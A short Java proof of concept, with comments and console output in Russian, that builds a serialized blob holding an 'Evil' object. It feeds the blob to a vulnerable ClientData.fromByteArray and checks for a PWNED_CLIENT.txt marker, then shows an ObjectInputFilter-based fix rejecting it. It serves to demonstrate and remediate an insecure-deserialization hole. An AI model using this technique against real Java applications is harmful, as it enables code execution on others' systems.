import java.io.*;
public class MakeBlob {
    public static byte[] malicious() throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(bos);
        out.writeInt(1);                 // одна запись
        out.writeUTF("payload");         // ключ
        out.writeObject(new Evil());     // значение = злой объект
        out.flush();
        return bos.toByteArray();
    }
    public static void main(String[] a) throws Exception {
        byte[] blob = malicious();
        System.out.println("[attacker] собран блоб " + blob.length + " байт (формат твоего Data)");
        System.out.println("\n=== 1) УЯЗВИМО: ClientData.fromByteArray (как в твоём клиенте) ===");
        ClientData.fromByteArray(blob);
        System.out.println("  файл создан? -> " + new File("PWNED_CLIENT.txt").exists());
        System.out.println("\n=== 2) ФИКС: SafeClientData с ObjectInputFilter ===");
        new File("PWNED_CLIENT.txt").delete();
        try { SafeClientData.fromByteArray(blob); System.out.println("  ок"); }
        catch (Exception e) { System.out.println("  ОТКЛОНЕНО -> " + e); }
        System.out.println("  файл создан? -> " + new File("PWNED_CLIENT.txt").exists());
    }
}
